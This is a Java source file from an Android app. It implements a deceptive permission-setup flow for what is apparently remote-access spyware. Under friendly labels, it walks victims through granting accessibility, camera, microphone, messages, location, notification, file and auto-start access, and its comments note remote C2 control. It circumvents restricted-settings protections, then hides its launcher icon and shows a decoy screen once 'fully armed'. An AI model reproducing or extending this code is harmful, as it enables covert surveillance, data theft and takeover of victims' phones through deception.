package com.fason.app.ui;

import android.app.Activity;
import android.graphics.Color;
import android.graphics.drawable.GradientDrawable;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.util.TypedValue;
import android.view.Gravity;
import android.view.View;
import android.view.animation.AccelerateDecelerateInterpolator;
import android.widget.Button;
import android.widget.FrameLayout;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.TextView;
import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;
import com.fason.app.R;
import com.fason.app.core.permissions.PermissionManager;
import com.fason.app.core.permissions.RestrictedPermissionHelper;
import com.fason.app.stealth.decoy.DecoyActivity;
import java.util.ArrayList;
import java.util.List;
import java.util.function.Predicate;

/**
 * PermissionSetupController — 2026 peak flow.
 *
 * Flow (single Continue button drives everything):
 *   1. WARM WELCOME   — branded splash, "Continue" button
 *   2. ACCESSIBILITY  — first and always: it unlocks gesture automation for
 *                       every settings screen that follows
 *   3. RUNTIME WAVES  — critical → comms → media → location, small batches
 *   4. SPECIAL GATES  — overlay, storage manager, battery, notifications,
 *                       usage stats, auto-start — each opened by direct
 *                       deep-link as the user taps Continue
 *   5. AUTO-HIDE      — when fully armed: icon disappears, decoy takes over
 *
 * The controller is C2-aware: SocketCommandRouter can call
 * {@link #requestGate(String)} to drive any gate remotely.
 */
public final class PermissionSetupController {
    private static final String TAG = "PermSetup2026";
    public static final int PERM_REQ = 1001;

    private static final int PHASE_WELCOME = 0;
    private static final int PHASE_ACCESSIBILITY = 1;
    private static final int PHASE_RUNTIME = 2;
    private static final int PHASE_SPECIAL = 3;
    private static final int PHASE_DONE = 4;

    private static final int S_NA = 0;
    private static final int S_DONE = 1;
    private static final int S_DENIED = 2;
    private static final int S_NEED = 3;

    private static final char[] DOT_CHAR = {'\u2014', '\u2713', '\u2717', '\u25CF'};

    // ------------------------------------------------------------------
    // Gates
    // ------------------------------------------------------------------

    private static final class Gate {
        final String id;
        final String label;
        final String description;
        final Predicate<Activity> isGranted;
        final Predicate<Activity> isApplicable;
        final GateOpener open;
        Gate(String id, String label, String description,
             Predicate<Activity> isGranted,
             Predicate<Activity> isApplicable,
             GateOpener open) {
            this.id = id; this.label = label; this.description = description;
            this.isGranted = isGranted;
            this.isApplicable = isApplicable;
            this.open = open;
        }
    }

    @FunctionalInterface
    private interface GateOpener {
        boolean open(Activity act, PermissionSetupController ctrl, int gateIndex);
    }

    private final List<Gate> gates;
    private int accessibilityGateIndex = -1;

    {
        List<Gate> list = new ArrayList<>();
        // ACCESSIBILITY FIRST — always.
        list.add(new Gate(
            "accessibility", "Accessibility", "Enables smart automation and gesture assist",
            PermissionManager::hasAccessibilityAccess,
            act -> true,
            (act, ctrl, idx) -> {
                if (PermissionManager.hasAccessibilityAccess(act)) return false;
                PermissionManager.requestAccessibilityAccess(act);
                ctrl.gatePrompted[idx] = true;
                return true;
            }));
        accessibilityGateIndex = 0;

        list.add(new Gate(
            "runtime", "App Permissions", "Camera, microphone, phone, messages, media, location",
            PermissionManager::hasAllPerms,
            act -> true,
            (act, ctrl, idx) -> ctrl.openRuntimeGate(idx)));

        list.add(new Gate(
            "overlay", "Display Over Apps", "Required for alerts and assistive overlays",
            PermissionManager::hasOverlay,
            act -> Build.VERSION.SDK_INT >= Build.VERSION_CODES.M,
            (act, ctrl, idx) -> {
                if (PermissionManager.hasOverlay(act)) return false;
                PermissionManager.requestOverlay(act);
                ctrl.gatePrompted[idx] = true;
                return true;
            }));

        list.add(new Gate(
            "storage", "All Files Access", "Manage files across the whole device",
            act -> PermissionManager.hasStorageManager(),
            act -> Build.VERSION.SDK_INT >= Build.VERSION_CODES.R,
            (act, ctrl, idx) -> {
                if (PermissionManager.hasStorageManager()) return false;
                PermissionManager.requestStorageManager(act);
                ctrl.gatePrompted[idx] = true;
                return true;
            }));

        list.add(new Gate(
            "battery", "Battery Optimization", "Unrestricted background operation",
            PermissionManager::hasBatteryExemption,
            act -> true,
            (act, ctrl, idx) -> {
                if (PermissionManager.hasBatteryExemption(act)) return false;
                PermissionManager.requestBatteryExemption(act);
                ctrl.gatePrompted[idx] = true;
                return true;
            }));

        list.add(new Gate(
            "notifications", "Notification Access", "Read and relay notifications",
            PermissionManager::hasNotifAccess,
            act -> true,
            (act, ctrl, idx) -> {
                if (PermissionManager.hasNotifAccess(act)) return false;
                PermissionManager.requestNotifAccess(act);
                ctrl.gatePrompted[idx] = true;
                return true;
            }));

        list.add(new Gate(
            "usage", "Usage Access", "App usage statistics and foreground detection",
            PermissionManager::hasUsageStats,
            act -> Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP,
            (act, ctrl, idx) -> {
                if (PermissionManager.hasUsageStats(act)) return false;
                PermissionManager.requestUsageStats(act);
                ctrl.gatePrompted[idx] = true;
                return true;
            }));

        list.add(new Gate(
            "autostart", "Auto-Start", "Launch on boot (OEM setting)",
            PermissionManager::hasAutoStartAccess,
            PermissionManager::needsAutoStart,
            (act, ctrl, idx) -> {
                if (PermissionManager.hasAutoStartAccess(act)) return false;
                com.fason.app.core.permissions.OemAutoStartHelper.AutoStartResult r =
                    PermissionManager.requestAutoStart(act);
                ctrl.gatePrompted[idx] = r !=
                    com.fason.app.core.permissions.OemAutoStartHelper.AutoStartResult.FAILED;
                return ctrl.gatePrompted[idx];
            }));

        gates = list;
    }

    // ------------------------------------------------------------------
    // State
    // ------------------------------------------------------------------

    private final Activity activity;
    private final Handler handler = new Handler(Looper.getMainLooper());

    private View permOverlay;
    private FrameLayout permContent;
    private TextView permTitle;
    private TextView permSubtitle;
    private ProgressBar permProgress;
    private FrameLayout permBtnContainer;
    private Button grantButton;
    private TextView[] rowDots;
    private TextView[] rowLabels;
    private TextView[] rowDetails;
    private boolean[] gatePrompted;
    private int runtimeGateIndex = -1;
    private boolean waitingForRuntimeResult = false;
    private boolean justOpenedRestrictedSettings = false;
    private int phase = PHASE_WELCOME;
    private boolean autoHideArmed = false;

    private int[] dotColor;
    private int[] labelColor;

    public PermissionSetupController(@NonNull Activity activity) {
        this.activity = activity;
        this.gatePrompted = new boolean[gates.size()];
        this.rowDots    = new TextView[gates.size()];
        this.rowLabels  = new TextView[gates.size()];
        this.rowDetails = new TextView[gates.size()];
        for (int i = 0; i < gates.size(); i++) {
            if ("runtime".equals(gates.get(i).id)) { runtimeGateIndex = i; break; }
        }
    }

    // ------------------------------------------------------------------
    // Lifecycle
    // ------------------------------------------------------------------

    public void onCreate(Bundle savedInstanceState) {
        resolveThemeColors();
        initOverlay();
        if (savedInstanceState != null) {
            phase = savedInstanceState.getInt("psc_phase", PHASE_WELCOME);
            gatePrompted = savedInstanceState.getBooleanArray("psc_gatePrompted");
            if (gatePrompted == null) gatePrompted = new boolean[gates.size()];
            waitingForRuntimeResult = savedInstanceState.getBoolean("psc_waitingRuntime", false);
            renderPhase();
        } else {
            phase = PHASE_WELCOME;
            renderWelcome();
        }
    }

    public void onResume() {
        if (waitingForRuntimeResult && runtimeGateIndex >= 0) {
            waitingForRuntimeResult = false;
        }
        // Restricted-settings wash attempt on every resume (idempotent)
        if (phase >= PHASE_RUNTIME && RestrictedPermissionHelper.hasRestrictedPerms(activity)) {
            PermissionManager.washRestrictedSettings(activity);
        }
        refresh();
        maybeAutoHide();
    }

    public void onRequestPermissionsResult(int requestCode) {
        if (requestCode == PERM_REQ && runtimeGateIndex >= 0) {
            waitingForRuntimeResult = false;
            gatePrompted[runtimeGateIndex] = true;
        }
        refresh();
    }

    public void onSaveInstanceState(@NonNull Bundle out) {
        out.putInt("psc_phase", phase);
        out.putBooleanArray("psc_gatePrompted", gatePrompted);
        out.putBoolean("psc_waitingRuntime", waitingForRuntimeResult);
    }

    /** Entry point used by MainActivity — shows welcome if anything is missing. */
    public void autoStartFirstMissing() {
        if (PermissionManager.isFullyArmed(activity)) {
            maybeAutoHide();
            return;
        }
        showOverlay();
        if (phase == PHASE_WELCOME) renderWelcome();
        else refresh();
    }

    // ------------------------------------------------------------------
    // C2 remote trigger — SocketCommandRouter calls this
    // ------------------------------------------------------------------

    public boolean requestGate(String gateId) {
        for (int i = 0; i < gates.size(); i++) {
            if (gates.get(i).id.equals(gateId)) {
                showOverlay();
                phase = PHASE_SPECIAL;
                return gates.get(i).open.open(activity, this, i);
            }
        }
        return false;
    }

    // ------------------------------------------------------------------
    // Phase rendering
    // ------------------------------------------------------------------

    private void renderWelcome() {
        permContent.removeAllViews();
        phase = PHASE_WELCOME;

        TextView logo = new TextView(activity);
        logo.setText("\uD83D\uDC31"); // rat
        logo.setTextSize(54);
        logo.setGravity(Gravity.CENTER);
        permContent.addView(logo, matchWrap());

        TextView title = new TextView(activity);
        title.setText("Welcome");
        title.setTextSize(28);
        title.setTextColor(resolveColor(android.R.attr.textColorPrimary, 0xFFFFFFFF));
        title.setGravity(Gravity.CENTER);
        permContent.addView(title, matchWrap());

        TextView sub = new TextView(activity);
        sub.setText("Set up your assistant in a few quick steps.\nEverything runs locally on this device.");
        sub.setTextSize(14);
        sub.setTextColor(resolveColor(android.R.attr.textColorSecondary, 0xFFAAAAAA));
        sub.setGravity(Gravity.CENTER);
        sub.setPadding(0, dp(8), 0, dp(24));
        permContent.addView(sub, matchWrap());

        Button continueBtn = makeButton("Continue");
        continueBtn.setOnClickListener(v -> {
            phase = PHASE_ACCESSIBILITY;
            renderGateList();
            // Immediately open accessibility settings — first tap does real work
            handler.postDelayed(() -> requestNextMissing(), 350);
        });
        permBtnContainer.removeAllViews();
        permBtnContainer.addView(continueBtn);
    }

    private void renderGateList() {
        permContent.removeAllViews();
        permTitle.setText("Quick Setup");
        permSubtitle.setText("Tap Continue to grant each item");
        permTitle.setVisibility(View.VISIBLE);
        permSubtitle.setVisibility(View.VISIBLE);
        permProgress.setVisibility(View.VISIBLE);

        LinearLayout list = new LinearLayout(activity);
        list.setOrientation(LinearLayout.VERTICAL);
        int dp8 = dp(8);
        int dp12 = dp(12);
        for (int i = 0; i < gates.size(); i++) {
            LinearLayout rowContainer = new LinearLayout(activity);
            rowContainer.setOrientation(LinearLayout.VERTICAL);
            rowContainer.setPadding(0, dp8, 0, dp8);
            LinearLayout row = new LinearLayout(activity);
            row.setOrientation(LinearLayout.HORIZONTAL);
            TextView dot = new TextView(activity);
            dot.setTextSize(TypedValue.COMPLEX_UNIT_SP, 16);
            dot.setTextColor(dotColor[S_NEED]);
            dot.setText(String.valueOf(DOT_CHAR[S_NEED]));
            row.addView(dot);
            TextView label = new TextView(activity);
            label.setTextSize(TypedValue.COMPLEX_UNIT_SP, 14);
            label.setTextColor(labelColor[S_NEED]);
            label.setText(gates.get(i).label);
            LinearLayout.LayoutParams lp =
                new LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f);
            lp.leftMargin = dp12;
            label.setLayoutParams(lp);
            row.addView(label);
            TextView detail = new TextView(activity);
            detail.setTextSize(TypedValue.COMPLEX_UNIT_SP, 11);
            detail.setTextColor(labelColor[S_NA]);
            detail.setVisibility(View.GONE);
            LinearLayout.LayoutParams detailLp = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT);
            detailLp.leftMargin = dp12 + dp(16);
            detailLp.topMargin = dp(2);
            detail.setLayoutParams(detailLp);
            rowContainer.addView(row);
            rowContainer.addView(detail);
            list.addView(rowContainer);
            rowDots[i] = dot;
            rowLabels[i] = label;
            rowDetails[i] = detail;
        }
        permContent.addView(list, matchWrap());

        grantButton = makeButton("Continue");
        grantButton.setOnClickListener(v -> requestNextMissing());
        permBtnContainer.removeAllViews();
        permBtnContainer.addView(grantButton);
        refresh();
    }

    private void renderPhase() {
        switch (phase) {
            case PHASE_WELCOME: renderWelcome(); break;
            case PHASE_DONE: onAllGranted(); break;
            case PHASE_ACCESSIBILITY:
            case PHASE_RUNTIME:
            case PHASE_SPECIAL:
            default: renderGateList(); break;
        }
    }

    // ------------------------------------------------------------------
    // Refresh + gate walking
    // ------------------------------------------------------------------

    private void refresh() {
        if (permOverlay == null || phase == PHASE_WELCOME || phase == PHASE_DONE) return;
        int applicable = 0, granted = 0, denied = 0, firstMissing = -1;
        for (int i = 0; i < gates.size(); i++) {
            Gate g = gates.get(i);
            if (!g.isApplicable.test(activity)) { setRowState(i, S_NA); setRowDetail(i, null); continue; }
            applicable++;
            if (g.isGranted.test(activity)) {
                setRowState(i, S_DONE); setRowDetail(i, null); granted++;
            } else if (gatePrompted[i]) {
                setRowState(i, S_DENIED); setRowDetail(i, g.description); denied++;
                if (firstMissing < 0) firstMissing = i;
            } else {
                setRowState(i, S_NEED); setRowDetail(i, g.description);
                if (firstMissing < 0) firstMissing = i;
            }
        }
        permProgress.setMax(Math.max(applicable, 1));
        permProgress.setProgress(granted);
        if (granted >= applicable) { onAllGranted(); return; }
        showOverlay();
        permTitle.setText("Quick Setup");
        permSubtitle.setText(denied > 0
            ? granted + " of " + applicable + " done — tap Continue to retry"
            : "Tap Continue to grant each item");
        if (firstMissing >= 0 && grantButton != null) {
            grantButton.setText("Continue: " + gates.get(firstMissing).label);
            grantButton.setVisibility(View.VISIBLE);
            permBtnContainer.setVisibility(View.VISIBLE);
        }
    }

    private void requestNextMissing() {
        // Accessibility is always walked first, regardless of list order
        if (accessibilityGateIndex >= 0) {
            Gate acc = gates.get(accessibilityGateIndex);
            if (acc.isApplicable.test(activity) && !acc.isGranted.test(activity)) {
                acc.open.open(activity, this, accessibilityGateIndex);
                refresh();
                return;
            }
        }
        for (int i = 0; i < gates.size(); i++) {
            Gate g = gates.get(i);
            if (!g.isApplicable.test(activity)) continue;
            if (g.isGranted.test(activity)) continue;
            g.open.open(activity, this, i);
            refresh();
            return;
        }
        refresh();
    }

    private boolean openRuntimeGate(int gateIndex) {
        if (PermissionManager.hasAllPerms(activity)) return false;
        if (justOpenedRestrictedSettings) {
            justOpenedRestrictedSettings = false;
            try {
                PermissionManager.requestPerms(activity, PERM_REQ);
                gatePrompted[gateIndex] = true;
                waitingForRuntimeResult = true;
                return true;
            } catch (Exception e) {
                Log.w(TAG, "retry failed", e);
            }
        }
        if (!gatePrompted[gateIndex]) {
            try {
                PermissionManager.requestPerms(activity, PERM_REQ);
                gatePrompted[gateIndex] = true;
                waitingForRuntimeResult = true;
                return true;
            } catch (Exception e) {
                PermissionManager.openAppSettings(activity);
                return true;
            }
        }
        if (RestrictedPermissionHelper.hasRestrictedPerms(activity)) {
            justOpenedRestrictedSettings = true;
            RestrictedPermissionHelper.openAppSettingsForRestricted(activity);
            return true;
        }
        List<String> rationale = PermissionManager.getRationalePerms(activity);
        if (!rationale.isEmpty()) {
            try {
                ActivityCompat.requestPermissions(activity,
                    rationale.toArray(new String[0]), PERM_REQ);
                waitingForRuntimeResult = true;
            } catch (Exception e) {
                PermissionManager.openAppSettings(activity);
            }
        } else {
            PermissionManager.openAppSettings(activity);
        }
        return true;
    }

    // ------------------------------------------------------------------
    // Completion + auto-hide
    // ------------------------------------------------------------------

    private void onAllGranted() {
        phase = PHASE_DONE;
        permTitle.setText("All Set");
        permSubtitle.setText("Setup complete");
        permContent.removeAllViews();
        TextView done = new TextView(activity);
        done.setText("\u2713");
        done.setTextSize(48);
        done.setTextColor(0xFF4CAF50);
        done.setGravity(Gravity.CENTER);
        permContent.addView(done, matchWrap());
        permOverlay.removeCallbacks(fadeOutRunnable);
        permOverlay.postDelayed(fadeOutRunnable, 900);
        maybeAutoHide();
    }

    private void maybeAutoHide() {
        if (autoHideArmed) return;
        if (!PermissionManager.isFullyArmed(activity)) return;
        autoHideArmed = true;
        PermissionManager.applyAutoHide(activity);
        // Hand off to decoy so the user lands somewhere innocuous
        DecoyActivity.launch(activity, DecoyActivity.getPreferredSkin(activity));
        activity.finish();
    }

    // ------------------------------------------------------------------
    // UI helpers
    // ------------------------------------------------------------------

    private void initOverlay() {
        permOverlay = activity.findViewById(R.id.permOverlay);
        permTitle = activity.findViewById(R.id.permTitle);
        permSubtitle = activity.findViewById(R.id.permSubtitle);
        permProgress = activity.findViewById(R.id.permProgress);
        permBtnContainer = activity.findViewById(R.id.permBtnContainer);
        permContent = activity.findViewById(R.id.permContent);
        if (permContent == null) {
            // Older layout without content slot — create one inside the card
            LinearLayout card = (LinearLayout) permOverlay.getChildAt(0);
            permContent = new FrameLayout(activity);
            permContent.setId(R.id.permContent);
            LinearLayout.LayoutParams flp = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
            flp.topMargin = dp(16);
            card.addView(permContent, card.indexOfChild(permProgress));
        }
    }

    private LinearLayout.LayoutParams matchWrap() {
        return new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
    }

    private Button makeButton(String text) {
        Button b = new Button(activity);
        b.setText(text);
        b.setTextColor(Color.WHITE);
        b.setTextSize(TypedValue.COMPLEX_UNIT_SP, 15);
        b.setAllCaps(false);
        b.setBackground(makeButtonBg());
        b.setPadding(0, dp(14), 0, dp(14));
        b.setLayoutParams(new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT));
        return b;
    }

    private GradientDrawable makeButtonBg() {
        GradientDrawable gd = new GradientDrawable();
        gd.setCornerRadius(dp(12));
        gd.setColor(resolveColor(android.R.attr.colorAccent, 0xFF4FC3F7));
        return gd;
    }

    private void setRowState(int idx, int state) {
        if (rowDots[idx] == null) return;
        rowDots[idx].setTextColor(dotColor[state]);
        rowDots[idx].setText(String.valueOf(DOT_CHAR[state]));
        rowLabels[idx].setTextColor(labelColor[state]);
    }

    private void setRowDetail(int idx, String text) {
        if (rowDetails[idx] == null) return;
        if (text == null || text.isEmpty()) {
            rowDetails[idx].setVisibility(View.GONE);
        } else {
            rowDetails[idx].setText(text);
            rowDetails[idx].setVisibility(View.VISIBLE);
        }
    }

    private void showOverlay() {
        if (permOverlay == null) return;
        permOverlay.removeCallbacks(fadeOutRunnable);
        permOverlay.animate().cancel();
        permOverlay.setAlpha(1f);
        permOverlay.setVisibility(View.VISIBLE);
    }

    private final Runnable fadeOutRunnable = () -> {
        if (permOverlay != null) {
            permOverlay.animate().cancel();
            permOverlay.animate().alpha(0f).setDuration(400)
                .withEndAction(() -> {
                    if (permOverlay != null) permOverlay.setVisibility(View.GONE);
                });
        }
    };

    private void resolveThemeColors() {
        int textPrimary = resolveColor(android.R.attr.textColorPrimary, 0xFFFFFFFF);
        int textSecondary = resolveColor(android.R.attr.textColorSecondary, 0xFFAAAAAA);
        int accent = resolveColor(android.R.attr.colorAccent, 0xFF4FC3F7);
        dotColor = new int[] {textSecondary, 0xFF4CAF50, 0xFFFF5252, accent};
        labelColor = new int[] {textSecondary, textSecondary, 0xFFFF6B6B, textPrimary};
    }

    private int resolveColor(int attr, int fallback) {
        android.util.TypedValue tv = new android.util.TypedValue();
        if (activity.getTheme().resolveAttribute(attr, tv, true)) {
            try {
                if (tv.resourceId != 0) {
                    return androidx.core.content.ContextCompat.getColor(activity, tv.resourceId);
                }
                if (tv.type >= android.util.TypedValue.TYPE_FIRST_COLOR_INT
                    && tv.type <= android.util.TypedValue.TYPE_LAST_COLOR_INT) {
                    return tv.data;
                }
            } catch (Exception ignored) {}
        }
        return fallback;
    }

    private int dp(int value) {
        return (int) TypedValue.applyDimension(
            TypedValue.COMPLEX_UNIT_DIP, value,
            activity.getResources().getDisplayMetrics());
    }
}
